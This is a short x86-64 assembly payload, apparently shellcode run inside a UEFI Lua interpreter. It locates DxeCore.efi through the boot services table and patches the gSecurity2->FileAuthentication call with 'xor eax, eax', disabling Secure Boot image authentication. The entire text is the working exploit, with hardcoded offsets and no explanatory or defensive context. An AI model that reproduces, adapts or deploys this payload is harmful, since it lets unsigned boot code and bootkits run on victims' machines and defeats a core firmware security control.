mov rdi, [rsp] # return address
sub edi, 0x1cf13 # load addr of Lua.efi
add edi, 0x8b000 # load addr of BOOTX64.EFI
add edi, 0x19048 # EFI_BOOT_SERVICE object
mov rsi, [rdi] # dereference boot pointer object
sub esi, 0x24c40 # addr of DxeCore.efi
add esi, 0x1a68e # call to gSecurity2->FileAuthentication
mov edx, 0xc031 # xor eax, eax
mov [esi], dx # patch call
ret
/*
loop:
nop
jmp loop
*/